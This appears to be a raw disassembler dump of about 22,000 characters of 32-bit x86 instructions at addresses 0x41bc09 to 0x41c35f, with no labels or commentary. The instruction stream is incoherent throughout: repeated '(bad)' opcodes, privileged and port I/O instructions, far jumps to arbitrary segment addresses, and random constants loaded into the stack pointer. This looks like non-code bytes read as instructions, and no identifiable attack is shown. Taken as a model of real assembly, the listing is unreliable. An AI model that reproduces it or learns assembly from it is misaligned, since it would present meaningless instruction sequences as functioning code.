  41bc09:	ja     0x41bbbd
  41bc0b:	fld    st(1)
  41bc0d:	mov    esp,0xb43d3c7d
  41bc12:	ret    
  41bc13:	neg    BYTE PTR [edx]
  41bc15:	mov    edx,0x689ac8da
  41bc1a:	popf   
  41bc1b:	scas   al,BYTE PTR es:[edi]
  41bc1c:	sub    BYTE PTR [esp+eiz*2-0x7f],al
  41bc20:	jno    0x41bc15
  41bc22:	jg     0x41bc20
  41bc24:	sbb    BYTE PTR [ecx+0x7697a75],0x8a
  41bc2b:	aaa    
  41bc2c:	jno    0x41bbd9
  41bc2e:	mov    ebx,0xdd222c80
  41bc33:	add    esp,DWORD PTR [eax+0x39]
  41bc36:	and    al,0x39
  41bc38:	jno    0x41bbd8
  41bc3a:	xchg   DWORD PTR [ebp+eiz*2-0x4cd1509d],edx
  41bc41:	and    eax,0x3f0d4be8
  41bc46:	cwde   
  41bc47:	retf   
  41bc48:	fdiv   DWORD PTR [ebx-0x6932e510]
  41bc4e:	sbb    DWORD PTR [ecx-0x36075c9f],ebx
  41bc54:	test   BYTE PTR [edi],bl
  41bc56:	dec    edx
  41bc57:	and    al,ch
  41bc59:	shr    BYTE PTR [ebx-0x75],cl
  41bc5c:	push   0x39
  41bc5e:	int    0x2b
  41bc60:	stc    
  41bc61:	sub    esi,DWORD PTR [ebx+0x7f]
  41bc64:	push   ss
  41bc65:	dec    ebp
  41bc66:	and    DWORD PTR [esi+0x12],esi
  41bc69:	jne    0x41bc22
  41bc6b:	sti    
  41bc6c:	test   al,0xbf
  41bc6e:	ja     0x41bc20
  41bc70:	popa   
  41bc71:	rcl    eax,cl
  41bc73:	xchg   DWORD PTR [edi+0x47],ebp
  41bc76:	outs   dx,BYTE PTR gs:[esi]
  41bc78:	adc    ecx,ecx
  41bc7a:	inc    ebx
  41bc7b:	leave  
  41bc7c:	xor    al,0xe6
  41bc7e:	push   ds
  41bc7f:	xlat   BYTE PTR ds:[ebx]
  41bc80:	adc    al,0xd7
  41bc82:	push   ss
  41bc83:	pop    ss
  41bc84:	push   es
  41bc85:	out    dx,al
  41bc86:	loopne 0x41bcce
  41bc88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc89:	int3   
  41bc8a:	xor    ebx,DWORD PTR [edx+0x4d]
  41bc8d:	inc    ecx
  41bc8e:	enter  0x189e,0xe7
  41bc92:	inc    eax
  41bc93:	pushf  
  41bc94:	enter  0x4de9,0x47
  41bc98:	call   0x9fbc:0xf7d9b005
  41bc9f:	and    al,0xa4
  41bca1:	xchg   edx,eax
  41bca2:	stc    
  41bca3:	xor    bh,BYTE PTR [ecx]
  41bca5:	aas    
  41bca6:	jecxz  0x41bc3d
  41bca8:	jb     0x41bcbb
  41bcaa:	or     eax,0xad063600
  41bcaf:	lods   al,BYTE PTR ds:[esi]
  41bcb0:	(bad)  
  41bcb1:	js     0x41bc6b
  41bcb3:	mov    ch,BYTE PTR [esi+edx*4+0x6b6e2512]
  41bcba:	popa   
  41bcbb:	jno    0x41bd15
  41bcbd:	push   ebx
  41bcbe:	push   esp
  41bcbf:	cli    
  41bcc0:	cli    
  41bcc1:	inc    eax
  41bcc2:	iret   
  41bcc3:	popa   
  41bcc4:	push   es
  41bcc5:	sbb    BYTE PTR [esi-0x1],bh
  41bcc8:	push   edi
  41bcc9:	es jne 0x41bc7a
  41bccc:	pop    ebx
  41bccd:	imul   ecx,edi,0x137c61f6
  41bcd3:	data16 lahf 
  41bcd5:	push   ebx
  41bcd6:	fdiv   DWORD PTR [edx+0x293eec0e]
  41bcdc:	fist   DWORD PTR [edx-0xc]
  41bcdf:	gs xchg edx,eax
  41bce1:	and    bl,BYTE PTR [ecx-0x4a]
	...
  41bcf0:	add    ah,bh
  41bcf2:	mov    WORD PTR [ebx+edx*8-0x5000040c],?
  41bcf9:	and    al,0xd
  41bcfb:	jmp    0x41bd54
  41bcfd:	ret    0xc90e
  41bd00:	into   
  41bd01:	mov    ebp,0xab000139
  41bd06:	add    eax,DWORD PTR [eax]
  41bd08:	add    BYTE PTR [edi+0x3012af6],cl
  41bd0e:	cli    
  41bd0f:	ret    0xaefd
  41bd12:	(bad)  
  41bd14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bd15:	mov    ds:0xf2c82b5d,al
  41bd1a:	xchg   edi,eax
  41bd1b:	pop    edi
  41bd1c:	ja     0x41bd22
  41bd1e:	xchg   ebx,eax
  41bd1f:	(bad)  
  41bd20:	loopne 0x41bd67
  41bd22:	cmp    esi,DWORD PTR [ebx+0x6ca17f00]
  41bd28:	or     al,0xcb
  41bd2a:	push   ds
  41bd2b:	mov    eax,0xcceb7f7f
  41bd30:	push   eax
  41bd31:	loopne 0x41bd0c
  41bd33:	out    0x46,eax
  41bd35:	jno    0x41bd83
  41bd37:	jmp    0x41bd1e
  41bd39:	push   ebx
  41bd3a:	test   BYTE PTR [edi-0x65],dh
  41bd3d:	aas    
  41bd3e:	adc    ah,bl
  41bd40:	gs xor al,0x5f
  41bd43:	mov    bl,0xb9
  41bd45:	mov    edi,0xbd39f5aa
  41bd4a:	ret    
  41bd4b:	and    eax,0x320ac678
  41bd50:	jmp    0x28670314
  41bd55:	sub    BYTE PTR [ecx+ebp*2-0x34],ah
  41bd59:	je     0x41bce3
  41bd5b:	pop    esp
  41bd5c:	and    ebp,ebp
  41bd5e:	repz hlt 
  41bd60:	cmp    dl,al
  41bd62:	outs   dx,BYTE PTR ds:[esi]
  41bd63:	(bad)  [edx-0x7b]
  41bd66:	ret    
  41bd67:	ret    
  41bd68:	jmp    DWORD PTR [ebx+edx*4-0x3c]
  41bd6c:	jmp    0x9c6c:0x49a10535
  41bd73:	mov    esi,0x275d192c
  41bd78:	jl     0x41bd1c
  41bd7a:	fsubr  DWORD PTR [edx+eax*1+0x1463af06]
  41bd81:	push   eax
  41bd82:	push   ecx
  41bd83:	sahf   
  41bd84:	push   edx
  41bd85:	pop    es
  41bd86:	jge    0x41bd0f
  41bd88:	inc    esp
  41bd89:	push   esp
  41bd8a:	pop    esi
  41bd8b:	xchg   edx,eax
  41bd8c:	mov    ah,0xae
  41bd8e:	aad    0x6f
  41bd90:	add    DWORD PTR [ebx],0xffffffe5
  41bd93:	xchg   edx,eax
  41bd94:	(bad)  
  41bd95:	enter  0xd443,0xa3
  41bd99:	icebp  
  41bd9a:	and    BYTE PTR [ebx],dl
  41bd9c:	add    al,BYTE PTR [edx+0x3982922a]
  41bda2:	mov    bl,0xf2
  41bda4:	pop    edx
  41bda5:	and    al,dh
  41bda7:	dec    edi
  41bda8:	mov    bh,0xf4
  41bdaa:	mov    bh,0xcd
  41bdac:	jno    0x3155162
  41bdb2:	mov    al,ds:0x87880c9c
  41bdb7:	jo     0x41be26
  41bdb9:	and    al,BYTE PTR [ecx+eax*4-0x26]
  41bdbd:	in     al,dx
  41bdbe:	popf   
  41bdbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bdc0:	mul    BYTE PTR [esi]
  41bdc2:	xchg   ebp,eax
  41bdc3:	mov    cl,0x6b
  41bdc5:	add    BYTE PTR [edx+0x16],dh
  41bdc8:	mov    esp,0x7581f760
  41bdcd:	daa    
  41bdce:	arpl   bx,bp
  41bdd0:	sbb    BYTE PTR [edi],dh
  41bdd2:	outs   dx,BYTE PTR ds:[esi]
  41bdd3:	cmp    DWORD PTR [esi+0x5f],0xffffff9e
  41bdd7:	jo     0x41bd68
  41bdd9:	retf   
  41bdda:	icebp  
  41bddb:	xor    DWORD PTR [edi],0x78c051da
  41bde1:	and    al,0x5a
  41bde3:	jecxz  0x41be35
  41bde5:	pop    ss
  41bde6:	rcr    DWORD PTR [eax-0x3f],0xef
  41bdea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bdeb:	sub    BYTE PTR [ecx-0x1b],dh
  41bdee:	repnz sbb al,0xdf
  41bdf1:	fwait
  41bdf2:	inc    edi
  41bdf3:	adc    DWORD PTR ds:0xcea9b577,esi
  41bdf9:	sti    
  41bdfa:	push   0x5a
  41bdfc:	or     esp,DWORD PTR [eax]
  41bdfe:	mov    dl,0x77
  41be00:	sub    DWORD PTR [esp+edx*4],ebx
  41be03:	dec    ecx
  41be04:	mov    edi,0xc679b7e2
  41be09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be0a:	xor    dh,dh
  41be0c:	ins    BYTE PTR es:[edi],dx
  41be0d:	popf   
  41be0e:	dec    edi
  41be0f:	shl    BYTE PTR [esi-0x54],cl
  41be12:	or     edi,DWORD PTR [ebx]
  41be14:	lods   eax,DWORD PTR ds:[esi]
  41be15:	or     esp,DWORD PTR [esi+0x6da17e29]
  41be1b:	add    BYTE PTR [edx-0x6a],dh
  41be1e:	loope  0x41be02
  41be20:	inc    eax
  41be21:	adc    al,0xca
  41be23:	cwde   
  41be24:	lods   eax,DWORD PTR ds:[esi]
  41be25:	jo     0x41be3c
  41be27:	xchg   esp,eax
  41be28:	xchg   edx,eax
  41be29:	addr16 push esi
  41be2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41be2c:	and    ah,BYTE PTR [edx]
  41be2e:	push   cs
  41be2f:	push   edx
  41be30:	xchg   esp,eax
  41be31:	imul   ebp,DWORD PTR [edx],0xfffffff8
  41be34:	cmp    dh,BYTE PTR [esp+ebx*8]
  41be37:	pop    edx
  41be38:	icebp  
  41be39:	js     0x41be86
  41be3b:	or     dh,BYTE PTR [esp+edi*4-0x6b443ab]
  41be42:	cli    
  41be43:	outs   dx,BYTE PTR ds:[esi]
  41be44:	mov    ah,0x9c
  41be46:	xchg   DWORD PTR [edi+0x163487b7],eax
  41be4c:	in     al,0x1e
  41be4e:	cwde   
  41be4f:	inc    edi
  41be50:	das    
  41be51:	lahf   
  41be52:	repz das 
  41be54:	cmp    BYTE PTR [edx],0xcb
  41be57:	aas    
  41be58:	mov    esp,0x30edca2b
  41be5d:	lds    ebp,FWORD PTR [esi-0x7aa87ce5]
  41be63:	arpl   ax,di
  41be65:	cmp    dl,BYTE PTR [edx*8-0x293f6dfc]
  41be6c:	aad    0x6d
  41be6e:	test   ax,0x5c49
  41be72:	shl    BYTE PTR [ecx],1
  41be74:	mov    bh,0xcd
  41be76:	cmp    bh,BYTE PTR [eax+0x809a258]
  41be7c:	cmc    
  41be7d:	sahf   
  41be7e:	jmp    0xf2aa:0xb8e1c076
  41be85:	rcl    BYTE PTR [esi],cl
  41be87:	push   ds
  41be88:	imul   ebp,DWORD PTR [esi],0xffffffa8
  41be8b:	sbb    eax,0x85d0d562
  41be90:	clc    
  41be91:	and    eax,0xbbe24af6
  41be96:	adc    DWORD PTR [esi+eiz*8-0x85a3c86],ebx
  41be9d:	inc    esi
  41be9e:	rcl    DWORD PTR [edx-0x7c9b2bbc],cl
  41bea4:	stos   DWORD PTR es:[edi],eax
  41bea5:	mov    dl,0x52
  41bea7:	dec    eax
  41bea8:	jbe    0x41be71
  41beaa:	pop    esi
  41beab:	mov    ah,0x1f
  41bead:	popa   
  41beae:	pushf  
  41beaf:	iret   
  41beb0:	arpl   sp,sp
  41beb2:	pop    es
  41beb3:	push   0x2846b55c
  41beb8:	aam    0x54
  41beba:	cli    
  41bebb:	or     BYTE PTR [ecx],ch
  41bebd:	retf   0x37fb
  41bec0:	(bad)  
  41bec1:	pop    ss
  41bec2:	cs dec edx
  41bec4:	int3   
  41bec5:	xor    eax,0xfc54af0a
  41beca:	xchg   esi,eax
  41becb:	ficom  DWORD PTR [edx]
  41becd:	cwde   
  41bece:	fs daa 
  41bed0:	inc    esi
  41bed1:	lods   al,BYTE PTR ds:[esi]
  41bed2:	in     al,0x52
  41bed4:	push   ebp
  41bed5:	mov    ecx,0x795431fb
  41beda:	sbb    DWORD PTR [ebp-0x42],ebp
  41bedd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bede:	fdivp  st(3),st
  41bee0:	and    eax,0x501f30ca
  41bee5:	xchg   DWORD PTR [esi],ebp
  41bee7:	cmp    eax,0x9304d53f
  41beec:	iret   
  41beed:	mov    fs,ecx
  41beef:	cmp    eax,0xa0d26e89
  41bef4:	in     eax,0xf0
  41bef6:	mov    ds:0x5059f062,eax
  41befb:	push   ebx
  41befc:	rol    BYTE PTR [esi+0x16],0x9d
  41bf00:	ret    0x1a2b
  41bf03:	adc    edx,DWORD PTR [ebx+0x2851aef6]
  41bf09:	mov    bl,0xc9
  41bf0b:	mov    esi,0xdb5b5766
  41bf10:	dec    esp
  41bf11:	inc    edi
  41bf12:	rcr    ch,0x51
  41bf15:	das    
  41bf16:	lahf   
  41bf17:	or     eax,0xfdc92cf3
  41bf1c:	cmp    DWORD PTR [ebp+0x4c],0xffffffa4
  41bf20:	stos   DWORD PTR es:[edi],eax
  41bf21:	or     BYTE PTR [ecx+0x281753e4],bh
  41bf27:	dec    eax
  41bf28:	sub    eax,0xda7daa6a
  41bf2d:	and    DWORD PTR [esi],0xa0b7d013
  41bf33:	xchg   edx,eax
  41bf34:	mov    cl,0x6c
  41bf36:	add    ecx,DWORD PTR [edx-0x67]
  41bf39:	push   ebp
  41bf3a:	call   0x3b4cde91
  41bf3f:	sub    ch,bl
  41bf41:	or     dl,BYTE PTR [edi-0x2297bf65]
  41bf47:	xchg   esp,eax
  41bf48:	mov    al,0x26
  41bf4a:	xor    esp,ebp
  41bf4c:	add    eax,0xe7fa8495
  41bf51:	mov    edi,0x7637d1be
  41bf56:	mov    esi,edx
  41bf58:	jns    0x41bf6a
  41bf5a:	mov    ss,WORD PTR [esi]
  41bf5c:	cmp    eax,0x87d92e0a
  41bf61:	mov    ebx,0x6d08e026
  41bf66:	inc    ebp
  41bf67:	jae    0x41bf57
  41bf69:	ret    0x51a8
  41bf6c:	fucomi st,st(0)
  41bf6e:	dec    ecx
  41bf6f:	inc    eax
  41bf70:	popf   
  41bf71:	fidivr DWORD PTR [edx]
  41bf73:	xchg   edi,eax
  41bf74:	pop    ecx
  41bf75:	cmp    cl,BYTE PTR [edx+ecx*1+0x29]
  41bf79:	inc    edi
  41bf7a:	(bad)  
  41bf7b:	and    eax,0xa633d5d8
  41bf80:	stos   DWORD PTR es:[edi],eax
  41bf81:	or     BYTE PTR [ecx+edx*1+0x8e5ee7c],al
  41bf88:	(bad)  
  41bf89:	cmp    esi,DWORD PTR [ebp-0x5c]
  41bf8c:	sti    
  41bf8d:	jp     0x41bf82
  41bf8f:	addr16 jae 0x41bfea
  41bf92:	sbb    ch,BYTE PTR [esi-0x39]
  41bf95:	inc    edx
  41bf96:	inc    edi
  41bf97:	inc    edi
  41bf98:	jno    0x41bf51
  41bf9a:	scas   al,BYTE PTR es:[edi]
  41bf9b:	or     esi,DWORD PTR [esi+0x402ff5a2]
  41bfa1:	int3   
  41bfa2:	xchg   esi,eax
  41bfa3:	jb     0x41bfe7
  41bfa5:	lods   al,BYTE PTR ds:[esi]
  41bfa6:	dec    esp
  41bfa7:	jmp    0x35918e6c
  41bfac:	push   0x62
  41bfae:	addr16 mov dh,0xb
  41bfb1:	fnsave [edi-0x44865a03]
  41bfb7:	and    bh,BYTE PTR [esi+0x26]
  41bfba:	xchg   DWORD PTR [edx],edi
  41bfbc:	pop    edx
  41bfbd:	mov    al,0xd0
  41bfbf:	mov    dh,0x77
  41bfc1:	sub    al,0x21
  41bfc3:	pop    edi
  41bfc4:	push   ss
  41bfc5:	pop    es
  41bfc6:	jmp    0x4c15:0xb94da287
  41bfcd:	and    DWORD PTR [ebx],ecx
  41bfcf:	inc    ebx
  41bfd0:	stc    
  41bfd1:	and    ebx,DWORD PTR [ecx+0x161bf7fa]
  41bfd7:	arpl   WORD PTR [ebx+0x27],ax
  41bfda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bfdb:	rcr    cl,0xd1
  41bfde:	cmp    al,BYTE PTR [bp+si-0x3c]
  41bfe2:	cdq    
  41bfe3:	jno    0x41c059
  41bfe5:	jo     0x41c01f
  41bfe7:	dec    eax
  41bfe8:	sub    ecx,DWORD PTR ds:0x46513456
  41bfee:	pop    ecx
  41bfef:	in     al,0x6c
  41bff1:	fsub   QWORD PTR es:[edi+ecx*2]
  41bff5:	out    0x60,al
  41bff7:	jne    0x41bfab
  41bff9:	stc    
  41bffa:	adc    DWORD PTR [esi-0x5d4e6f3c],edi
  41c000:	push   cs
  41c001:	xchg   edx,eax
  41c002:	cwde   
  41c003:	test   DWORD PTR [ebp-0x2d03352e],ebp
  41c009:	ror    DWORD PTR [edi-0x5c284120],0x69
  41c010:	add    al,0x66
  41c012:	xchg   edi,eax
  41c013:	xor    BYTE PTR [eax-0x27],ah
  41c016:	fnstsw WORD PTR [ebx+0x8a69155]
  41c01c:	dec    ebp
  41c01d:	push   ebx
  41c01e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c01f:	fwait
  41c020:	inc    edx
  41c021:	xchg   edi,eax
  41c022:	out    dx,eax
  41c023:	jp     0x41bfff
  41c025:	in     eax,dx
  41c026:	jge    0x41c082
  41c028:	inc    edx
  41c029:	imul   esp,DWORD PTR [eax-0xc],0xf
  41c02d:	stos   DWORD PTR es:[edi],eax
  41c02e:	sbb    eax,0xbbc83474
  41c033:	inc    ecx
  41c034:	dec    edi
  41c035:	aam    0x66
  41c037:	mov    dh,0x15
  41c039:	lds    esi,FWORD PTR [esi+0x71]
  41c03c:	mov    cl,0xd2
  41c03e:	inc    edi
  41c03f:	daa    
  41c040:	sub    DWORD PTR [eax-0x3c],edi
  41c043:	out    0x29,eax
  41c045:	cmp    esi,DWORD PTR [eax]
  41c047:	xchg   DWORD PTR [esi],esp
  41c049:	ins    BYTE PTR es:[edi],dx
  41c04a:	dec    ecx
  41c04b:	push   ebx
  41c04c:	jae    0x41c08e
  41c04e:	jae    0x41c008
  41c050:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c051:	leave  
  41c052:	ins    BYTE PTR es:[edi],dx
  41c053:	adc    DWORD PTR ds:0xc4dceaac,ebp
  41c059:	retf   
  41c05a:	aad    0xd8
  41c05c:	pop    ss
  41c05d:	mov    edx,eax
  41c05f:	push   ebx
  41c060:	push   ecx
  41c061:	or     BYTE PTR [ecx],0x41
  41c064:	retf   0xff57
  41c067:	mov    BYTE PTR [eax+0x10],al
  41c06a:	xchg   edi,eax
  41c06b:	rol    DWORD PTR [esp-0x3d],0xa0
  41c070:	pushf  
  41c071:	cmp    BYTE PTR [ebx+0x2c092b91],al
  41c077:	sub    bh,BYTE PTR [ebp+0x69]
  41c07a:	sbb    ecx,ebx
  41c07c:	std    
  41c07d:	dec    ebx
  41c07e:	call   0xe89d:0x629a0e6
  41c085:	jg     0x41c0c0
  41c087:	add    esp,DWORD PTR [eax]
  41c089:	leave  
  41c08a:	fnstenv [ecx+0x5]
  41c08d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c08e:	pcmpeqw mm6,QWORD PTR [ebx-0x6f]
  41c092:	test   DWORD PTR [ecx+0x14a8db7d],edi
  41c098:	pop    ecx
  41c099:	inc    edx
  41c09a:	mov    edi,0x5b3a8bf2
  41c09f:	sbb    eax,0x295dfe31
  41c0a4:	(bad)  
  41c0a6:	das    
  41c0a7:	and    eax,0x89518881
  41c0ac:	mov    bh,BYTE PTR ds:0x22a9184f
  41c0b2:	neg    DWORD PTR [eax+0x0]
	...
  41c0c1:	retf   
  41c0c2:	test   al,0x91
  41c0c4:	sbb    eax,0xfecf3df3
  41c0c9:	dec    ebp
  41c0ca:	fisub  DWORD PTR [ecx+edi*1-0x71]
  41c0ce:	push   edx
  41c0cf:	add    eax,edx
  41c0d1:	push   0xab00013d
  41c0d6:	add    eax,DWORD PTR [eax]
  41c0d8:	add    BYTE PTR [esi+esi*1],al
  41c0db:	cmp    BYTE PTR [edi-0xd9651cf],dl
  41c0e1:	je     0x41c10a
  41c0e3:	out    0x5f,al
  41c0e5:	mov    edx,0x28324593
  41c0ea:	je     0x41c134
  41c0ec:	arpl   di,ax
  41c0ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c0ef:	call   FWORD PTR [ebx-0x4b81e24c]
  41c0f5:	pop    ebp
  41c0f6:	inc    eax
  41c0f7:	jge    0x41c169
  41c0f9:	and    DWORD PTR [edx+0x2b04f99d],esp
  41c0ff:	fsub   DWORD PTR [eax-0x382f7336]
  41c105:	xchg   esp,eax
  41c106:	fwait
  41c107:	cmc    
  41c108:	popf   
  41c109:	jle    0x41c0ce
  41c10b:	sub    al,0x2e
  41c10d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c10e:	jmp    DWORD PTR [ebp+0x31948463]
  41c114:	dec    ecx
  41c115:	and    BYTE PTR [eax-0x4a],ch
  41c118:	imul   eax,DWORD PTR [eax-0x68b00d88],0x64
  41c11f:	fwait
  41c120:	sbb    ebx,DWORD PTR [esi]
  41c122:	dec    ebp
  41c123:	arpl   WORD PTR [ebx-0x30],si
  41c126:	pop    ds
  41c127:	pop    edi
  41c128:	xchg   DWORD PTR [edi+0x1f],esi
  41c12b:	ja     0x41c129
  41c12d:	adc    eax,0xcf552136
  41c132:	fs push 0x4dab4ac0
  41c138:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c139:	mov    ?,esi
  41c13b:	xor    al,0xfa
  41c13d:	out    dx,eax
  41c13e:	sbb    DWORD PTR [edi+0x499d719c],ebx
  41c144:	push   esp
  41c145:	out    0x96,al
  41c147:	(bad)  
  41c148:	fnstcw WORD PTR [ebp-0x1637dbc2]
  41c14e:	repnz arpl sp,sp
  41c151:	(bad)  
  41c153:	mov    eax,ds:0xc023e535
  41c158:	das    
  41c159:	mov    al,0x94
  41c15b:	sahf   
  41c15c:	rcl    BYTE PTR [ebx],0xf7
  41c15f:	les    ebp,FWORD PTR [edx]
  41c161:	inc    edx
  41c162:	adc    BYTE PTR [edi-0x26ba3403],ch
  41c168:	jmp    0xe3fff9c
  41c16d:	dec    ebp
  41c16e:	jnp    0x41c18b
  41c170:	loopne 0x41c10e
  41c172:	arpl   WORD PTR cs:[si-0x7e],ax
  41c177:	mov    cl,0x8d
  41c179:	mov    DWORD PTR [ebx+edi*2],eax
  41c17c:	ror    ecx,0x64
  41c17f:	aad    0x37
  41c181:	jp     0x41c1b9
  41c183:	add    bh,BYTE PTR [edx+0x43]
  41c186:	imul   edi,DWORD PTR [ecx+0x35],0x6
  41c18a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c18b:	cmp    bl,BYTE PTR [ebx-0x44]
  41c18e:	test   DWORD PTR [ebx+eax*4],eax
  41c191:	stos   BYTE PTR es:[edi],al
  41c192:	pop    es
  41c193:	clc    
  41c194:	push   esi
  41c195:	call   DWORD PTR [edx+0x67b53c88]
  41c19b:	cmc    
  41c19c:	cmp    eax,0x865c28d9
  41c1a1:	adc    al,0x22
  41c1a3:	add    al,0x64
  41c1a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c1a6:	mov    al,ds:0xe95f7d30
  41c1ab:	jp     0x41c221
  41c1ad:	nop
  41c1ae:	je     0x41c1d1
  41c1b0:	retf   0x5933
  41c1b3:	pushf  
  41c1b4:	(bad)  
  41c1b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c1b6:	pop    edx
  41c1b7:	pop    ebp
  41c1b8:	fcmovnu st,st(0)
  41c1ba:	mov    bh,0xea
  41c1bc:	lds    ebx,FWORD PTR [edi+ecx*2+0x32]
  41c1c0:	fistp  WORD PTR cs:[eax+0x4f533ec8]
  41c1c7:	jge    0x41c228
  41c1c9:	xor    al,0x5a
  41c1cb:	push   eax
  41c1cc:	hlt    
  41c1cd:	mov    edx,DWORD PTR [ecx]
  41c1cf:	out    0xda,eax
  41c1d1:	(bad)  
  41c1d2:	xor    eax,0x94829242
  41c1d7:	into   
  41c1d8:	jg     0x41c1eb
  41c1da:	(bad)  
  41c1db:	stos   BYTE PTR es:[edi],al
  41c1dc:	or     dh,BYTE PTR [edi+0x72]
  41c1df:	rcl    DWORD PTR [eax-0x35],0xef
  41c1e3:	out    0x19,al
  41c1e5:	mov    dh,0x38
  41c1e7:	or     DWORD PTR [edx],ecx
  41c1e9:	adc    eax,0xd2bdbad2
  41c1ee:	adc    DWORD PTR [esi+0x6d920339],esi
  41c1f4:	jne    0x41c25e
  41c1f6:	gs sub ecx,ecx
  41c1f9:	lock scas eax,DWORD PTR es:[edi]
  41c1fb:	mov    DWORD PTR [ecx],esi
  41c1fd:	dec    eax
  41c1fe:	call   0xbdc5:0x40247232
  41c205:	lods   al,BYTE PTR ds:[esi]
  41c206:	outs   dx,BYTE PTR ds:[esi]
  41c207:	mov    bh,0x61
  41c209:	outs   dx,DWORD PTR ds:[esi]
  41c20a:	mov    ecx,0x7f0f3b5b
  41c20f:	mov    bl,0x42
  41c211:	or     esp,edi
  41c213:	mov    ebx,0xaf5e68f8
  41c218:	dec    eax
  41c219:	xor    DWORD PTR [ecx-0x67],0x6183bae1
  41c220:	out    0x28,eax
  41c222:	add    eax,0x566728c7
  41c227:	es jbe 0x41c237
  41c22a:	jl     0x41c1b3
  41c22c:	stos   DWORD PTR es:[edi],eax
  41c22d:	lea    eax,[eax-0xf]
  41c230:	mov    al,ds:0xf3200f
  41c235:	mov    esi,0xb97d05ce
  41c23a:	pop    ebp
  41c23b:	das    
  41c23c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c23d:	sbb    BYTE PTR [edi+0x453b5253],al
  41c243:	xchg   esi,eax
  41c244:	adc    DWORD PTR [edi+0x7aefed29],edx
  41c24a:	sub    DWORD PTR [ebx+ebp*4],edx
  41c24d:	js     0x41c2a0
  41c24f:	loopne 0x41c248
  41c251:	adc    eax,0x8cdec49
  41c256:	xlat   BYTE PTR ds:[ebx]
  41c257:	pop    ds
  41c258:	cmp    BYTE PTR [ecx],bh
  41c25a:	outs   dx,BYTE PTR ds:[esi]
  41c25b:	dec    DWORD PTR [edi]
  41c25d:	cs jle 0x41c1fe
  41c260:	call   0xe87a:0x65e7f742
  41c267:	mov    ebx,0x383db642
  41c26c:	jno    0x41c2cb
  41c26e:	jno    0x41c248
  41c270:	je     0x41c216
  41c272:	sbb    BYTE PTR [edx],ch
  41c274:	pop    edi
  41c275:	sub    BYTE PTR [ebx+ebx*4+0x25],ch
  41c279:	adc    DWORD PTR [eax+ebp*2+0x7c335366],esi
  41c280:	in     eax,0xd1
  41c282:	and    DWORD PTR [edi],0x16336dfe
  41c288:	xchg   ebx,eax
  41c289:	adc    BYTE PTR [esi],bl
  41c28b:	pop    ecx
  41c28c:	ds mov bh,0x71
  41c28f:	or     ebp,DWORD PTR [esp+ecx*4+0x95db16b]
  41c296:	push   ebx
  41c297:	mov    bl,0x3d
  41c299:	xchg   esp,esp
  41c29b:	pminsw mm6,QWORD PTR [edx]
  41c29e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c29f:	fisttp WORD PTR [ecx+ebx*4]
  41c2a2:	xor    eax,0x1dfe3d59
  41c2a7:	jle    0x41c235
  41c2a9:	jb     0x41c26e
  41c2ab:	dec    ebx
  41c2ac:	loopne 0x41c259
  41c2ae:	imul   esi,edi,0x9d520918
  41c2b4:	mov    edx,0x1ab0c6a7
  41c2b9:	ret    
  41c2ba:	retf   0x8283
  41c2bd:	jns    0x41c260
  41c2bf:	arpl   WORD PTR [edi+0x55292517],cx
  41c2c5:	add    eax,0x93248235
  41c2ca:	test   DWORD PTR [edx-0x41fbfb32],esp
  41c2d0:	int    0xff
  41c2d2:	xchg   ebp,eax
  41c2d3:	fldenv [eax]
  41c2d5:	fmul   DWORD PTR [eax-0x4a36f3e5]
  41c2db:	bswap  esp
  41c2dd:	test   bh,ah
  41c2df:	fcmovbe st,st(5)
  41c2e1:	jns    0x41c30c
  41c2e3:	mov    ebp,0x8c24f354
  41c2e8:	enter  0x6f3a,0xe7
  41c2ec:	outs   dx,BYTE PTR ds:[esi]
  41c2ed:	or     dh,ah
  41c2ef:	pop    ebx
  41c2f0:	ds (bad) 
  41c2f2:	in     al,0x96
  41c2f4:	aas    
  41c2f5:	add    ebx,DWORD PTR [esi]
  41c2f7:	aad    0x64
  41c2f9:	xor    eax,0xa121d479
  41c2fe:	add    eax,0xeb8b301a
  41c303:	xchg   ebx,eax
  41c304:	and    dh,BYTE PTR [esi-0xe]
  41c307:	js     0x41c356
  41c309:	imul   eax,DWORD PTR [ebp+0x6d],0x48
  41c30d:	jno    0x41c312
  41c30f:	mov    eax,0x38eef507
  41c314:	xchg   ecx,eax
  41c315:	xchg   DWORD PTR [esi+0x119c43d],eax
  41c31b:	pusha  
  41c31c:	push   ecx
  41c31d:	ret    
  41c31e:	(bad)  
  41c31f:	push   eax
  41c320:	(bad)  
  41c322:	sbb    al,BYTE PTR ds:0xee09efb
  41c329:	stos   DWORD PTR es:[edi],eax
  41c32a:	and    BYTE PTR [eax+edx*4+0x27],cl
  41c32e:	or     eax,0xe90e6968
  41c333:	push   0xfffffffb
  41c335:	lds    ebx,FWORD PTR [eax]
  41c337:	or     ch,bl
  41c339:	lock cmp BYTE PTR [edx+0x6cf51c23],bh
  41c340:	add    esp,DWORD PTR [edx+0x78cf12f9]
  41c346:	inc    ebp
  41c347:	in     eax,0xed
  41c349:	cmp    esp,DWORD PTR [ebx]
  41c34b:	test   al,0xdf
  41c34d:	adc    bh,cl
  41c34f:	bound  esi,QWORD PTR [ebp+0x4bfaf99f]
  41c355:	dec    eax
  41c356:	dec    ecx
  41c357:	lock dec esp
  41c359:	add    BYTE PTR [edi],0x69
  41c35c:	xchg   ecx,edx
  41c35e:	dec    esp
  41c35f:	sub    ch,BYTE PTR [esi-0x32]
